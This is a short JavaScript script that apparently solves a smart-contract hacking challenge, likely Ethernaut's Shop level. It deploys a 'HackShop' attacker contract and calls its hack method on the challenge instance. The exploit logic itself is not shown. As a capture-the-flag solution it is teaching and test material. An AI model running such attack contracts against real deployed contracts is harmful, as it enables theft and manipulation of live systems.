const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    console.log('Load attacker contract.')
    let attacker = loader.web3.fromArtifact('HackShop')

    console.log('Deploy attacker contract...')
    const { options: { address } } = await attacker.deploy().send()

    console.log('Load deployed attacker contract')
    attacker = loader.web3.fromArtifact('HackShop', address)

    console.log('Perform hack...')
    await attacker.methods.hack(instance).send()

    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
